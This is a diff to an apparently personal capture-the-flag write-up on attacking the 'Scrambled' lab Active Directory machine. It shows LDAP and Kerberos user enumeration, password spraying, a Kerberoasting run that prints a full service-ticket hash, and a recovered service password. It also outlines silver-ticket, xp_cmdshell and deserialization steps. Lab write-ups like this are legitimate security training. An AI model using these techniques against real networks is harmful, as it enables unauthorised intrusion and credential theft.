@@ -10,14 +10,42 @@ image: /assets/img/icons/Scrambled.png                # Add infocard image here 
 ---
 ### Host entries:
 ```bash
-10.10.11.168  DC1.scrm.local   
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.168    scrm.local dc1.scrm.local  
 ```
 If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.
 
 ### Content
 
-- 
-- 
+- LDAP Enumeration
+- Web Enumeration
+- Information Leakage
+- Kerberos Enumeration
+- Kerbrute Password Brute Force
+- Kerbrute SMB Enumeration
+- Kerberos Authentication [getTGT.py]
+- ASREPRoast Attack - GetNPUsers.py (Failed)
+- Kerberoasting Attack - GetUserSPNs.py Manipulating the GetUserSPNs.py script to make it work the way we want it to work
+- Cracking Hashes
+- Attempting to authenticate to the MSSQL service via kerberos (Failed)
+- Explaining Kerberos Auth Flow (TGT, TGS, KDC, AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP)
+- Explaining how Silver Ticket Attack works
+- Silver ticket attack. Forging a new TGS as Administrator user (NTLM Hash, Domain SID and SPN) ticketer.py && getPAC.py
+- CCACHE Technique Connecting to the MSSQL service with the newly created ticket
+- MSSQL Enumeration
+- Enabling xp_cmdshell component in MSSQL [RCE]
+- Abusing SeImpersonatePrivilege [JuicyPotatoNG Alternative for Windows Server 2019](https://github.com/antonioCoco/JuicyPotatoNG) (Unintended Way)
+- Binary and DLL Analysis
+- Downloading OpenVPN from a Windows machine and configuring it to reverse downloaded resources
+- Dnspy Installation
+- DLL Inspection with Dnspy - Found a backdoor in the code
+- We realize that serialization and deserialization of data is being used
+- Creating a malicious base64 serialized Payload with ysoserial.net in order to get RCE and send the serialized data to the server [Privilege Escalation]
 
 ### Reconnaissance
 
@@ -287,7 +315,141 @@ PORT      STATE SERVICE       REASON  VERSION
 49708/tcp open  msrpc         syn-ack Microsoft Windows RPC
 ```
 
+Crackmapexec output:
+```bash
+crackmapexec smb 10.10.11.168          
+SMB 10.10.11.168 445 NONE [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
+```
+
+There is a hostname in the port LDAP 3269:
+```bash
+3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC1.scrm.local
+```
+
+Adding this to the /etc/hosts for further attacks:
+```bash
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.168    DC1.scrm.local scrm.local
+```
+
+Enumeration with LDAP basic query: [^ldap-enum]
+```bash
+ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=scrm,DC=local
+namingcontexts: CN=Configuration,DC=scrm,DC=local
+namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
+namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
+namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+Enumeration (failed) with LDAP query to retrieve users:
+
+```bash
+ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts -b "dc=scrm,dc=local"
+# extended LDIF
+#
+# LDAPv3
+# base <dc=scrm,dc=local> with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+```
+
+Trying to connect to database using domain controller: ^8adc8a
+```bash
+impacket-mssqlclient scrm.local/sa:sa@10.10.11.168
+```
+
+Enumerating website we found a webpage with information disclosure:
+
+![[Pasted image 20230121214935.png]]
+
+Kerberos user enumeration with kerbrute: ^68a075
+```bash
+kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Kerberos/A-ZSurnames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop
+
+2023/01/21 22:44:31 >  Using KDC(s):
+2023/01/21 22:44:31 >   10.10.11.168:88
+
+2023/01/21 22:44:31 >  [+] VALID USERNAME:       ASMITH@scrm.local
+2023/01/21 22:45:06 >  [+] VALID USERNAME:       JHALL@scrm.local
+2023/01/21 22:45:11 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
+2023/01/21 22:45:13 >  [+] VALID USERNAME:       KHICKS@scrm.local
+2023/01/21 22:45:44 >  [+] VALID USERNAME:       SJENKINS@scrm.local
+2023/01/21 22:46:15 >  Done! Tested 13000 usernames (5 valid) in 104.092 seconds
+
+
+There is a web page under port 80 which has information about possible steps that can be made to access the internal network since NTLM is no longer active due to security reasons:
+
+![Security-NTLM](/assets/img/Pasted image 20230511075718.png)
+
+Inspecting the web page we notice that a user's name is being leaked on this image:
+![Leaked-user](/assets/img/Pasted image 20230511075506.png)
+
+It is always a good idea to gather more information on kerberos with the structure of the already leaked user for that we can use the following [kerberos usernames list](https://github.com/attackdebris/kerberos_enum_userlists) to enumerate valid user against the kerberos:
+
+```bash
+kerbrute userenum --dc 10.10.11.168 -d scrm.local /usr/share/seclists/Discovery/Kerberos/A-ZSurnames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 05/11/23 - Ronnie Flathers @ropnop
+
+2023/05/11 10:13:53 >  Using KDC(s):
+2023/05/11 10:13:53 >   10.10.11.168:88
+
+2023/05/11 10:13:53 >  [+] VALID USERNAME:       ASMITH@scrm.local
+2023/05/11 10:14:38 >  [+] VALID USERNAME:       JHALL@scrm.local
+2023/05/11 10:14:46 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
+2023/05/11 10:14:49 >  [+] VALID USERNAME:       KHICKS@scrm.local
+2023/05/11 10:15:24 >  [+] VALID USERNAME:       SJENKINS@scrm.local
+```
+
 ### Exploitation
+We then proceed to abuse this with kerbrute in bruteforce mode to execute a password spraying, sometimes the users use its username as password.
 
 ```bash
 kerbrute bruteuser --dc 10.10.11.168 -d scrm.local users ksimpson         
@@ -307,33 +469,55 @@ Version: dev (9cfb81e) - 05/10/23 - Ronnie Flathers @ropnop
 2023/05/10 08:41:14 >  Done! Tested 2 logins (1 successes) in 0.270 seconds
 ```
 
+Great! We got a valid user then let's proceed to use crackmapexec to check permissions on various services such as LDAP, SMB and MSSQL:
+```bash
+#SMB
+crackmapexec smb scrm.local -u ksimpson -p ksimpson                            
+SMB         scrm.local      445    scrm.local       [*]  x64 (name:scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
+SMB         scrm.local      445    scrm.local       [-] scrm.local\ksimpson:ksimpson STATUS_NOT_SUPPORTED
+
+```
+Since there is an error on crackmapexec that means NTLM (default mode for crackmapexec) is not supported and also considering the nothe from the website we can conclude that we need to user kerberos for our enumeration (flag -k):
 
 ```bash
-kerbrute userenum --dc 10.10.11.168 -d scrm.local /usr/share/seclists/Kerberos/A-ZSurnames.txt
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
-Version: dev (9cfb81e) - 05/10/23 - Ronnie Flathers @ropnop
-
-2023/05/10 08:42:12 >  Using KDC(s):
-2023/05/10 08:42:12 >   10.10.11.168:88
-
-2023/05/10 08:42:12 >  [+] VALID USERNAME:       ASMITH@scrm.local
-2023/05/10 08:42:53 >  [+] VALID USERNAME:       JHALL@scrm.local
-2023/05/10 08:42:58 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
-2023/05/10 08:43:00 >  [+] VALID USERNAME:       KHICKS@scrm.local
-2023/05/10 08:43:34 >  [+] VALID USERNAME:       SJENKINS@scrm.local
+crackmapexec ldap scrm.local -u ksimpson -p ksimpson -k                      
+LDAP        scrm.local      389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
+LDAPS       scrm.local      636    DC1.scrm.local   [+] scrm.local\ksimpson
 ```
+
+Now that we know that ksimpson account can be executed against LDAP let's proceed to execute a Kerberoasting[^kerberoasting-attack] attack with impacket-GetUserSPNs:
+```bash
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420             
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$24d27bd260ee324b7e91d298d36bac82$0ef77f99bcc2dd3104492d47169de822889dbf700441f8ce5079d6053ea8d576b18cf0201a06262ef41acb02092f900c7c038a80be268e5190be8a164333a3bc3f3486b6e090efd0bbcdf386e0a893b5234dd1471eb89db9d79dd8e8029480b7cd53c3c9d3ae82d0cb8950f9812f56f02b8cf1d9e789cb1f6e7e59ce4a3d84a940645c5159f187b6c5d3fb84ff2708ccb1e796e6baa0add65b7fc50d5e266797778fd06fba952a63a77f8f0323e17f2f456224765b80b4953aa3cf9e1d59045bd546167c287dcacef1e2f11f089a09a835db0f3875de36ca7ec451bd9af5bd06bbae1f046b6e2cfc223ddb1a2a727520f7c3d0e6b17b90431b726c948cca9ef9e3e025b54e6369b6a874bf2de874ff33dbb0b97c527616b87681ba790bf2937d2dbf3f82043f1112fd3393242f0421bf19c9dc8c03933de4a1da22b69e3fc86544621917d4c90f16c8191ce6167a1e1b88dce8b4f321c65d3c494b5372279ee9409ddfb204ad6ad84b934cfb91edee3092f079efe57f3c92a1151b5a01c155a051dca653a78521f6f3e860c623d99f58f9947d27124ffc53a041f1839e6026350f1e4fa345eb620e8f3b1ee63d2d4cf40791e428c24bcd5e0c2b25d25c91320b76a43f34e7ff5eec94b200d1039ff03134cd7ff44430fb65f5847ffa0e5a543229e4d645368c523310c3a06a451d439fd381b3810561895dddcba4015330d81b81ca830df8e89f88bc2a4ceff65f28af0f84b6e6d7eed8005482a9636d797f461dddc79010507c60f005ff3d38efef26f607ebb47e9d7898fa0daf1af9ac561024b0affc1ade3e29639d499a8c4c8f2ed31cc5fc2e025683b279f83466dad43c1c2fef42352147434c398b69821afb37d7cbdef9924c7fe1aea53af8f1e84e06b4f385675b98282977c39d3416bd471544a1134e0739fbed624b7dd5c6a460105e50c6631c8d1138a655bc9dc3c4ae51470a0ed3054adfb3719eff73ca92554532242f8ddad63b4a4f7f1aca07977e1ddf8bcde3cf661b4a1908fc8da9a481fe08e0aa52a8fad6225b862b58cd5d4664fbd2412832b7da4d484974881ee7bcd8814db1800fe48631a197c87307b167c1d0f5572f6d6b7074cc90bb57ff586bb135b9939614856c6252559edca5521da6c4ff749c222c511a30bcad6ff35e12d41946b327bd78378b9cf48700332b871b8260457c91b3a1c036dc0bed667c6e552ecde7be8bd5a6def019c38536852f73dbde02cf8f3451316e584a00557ffb91a5a6aa383867aac8b87c4ceda400f95ae633f07bf4ba1d79ee80604c424de215ffd0683b11a7f3401eaf6a9e3d8e3492f08edfe6c58d4fad8fa4a46a13422a20f886822898e0c060c1a48d86f13693e6779cffcce09fdba34f30da97d35a3a52c6393088c9ee2b12e8ae3ed11fb40fa3583cb99697015e727376c1
+```
+
+
+#MSSQL
+
+#LDAP
+crackmapexec ldap scrm.local -u ksimpson -p ksimpson -k --kdcHost dc1.scrm.local
+``` 
 
 ### Root privesc
 
 ### Post Exploitation
 
 ### Credentials
+```bash
+sqlsvc:Pegasus60
+```
 
 ### Notes
 
@@ -343,5 +527,5 @@ Version: dev (9cfb81e) - 05/10/23 - Ronnie Flathers @ropnop
 
 ### Resources:
 
-
-
+[^ldap-enum]: LDAP Enumeration
+[^kerberoasting-attack]: Kerberoasting
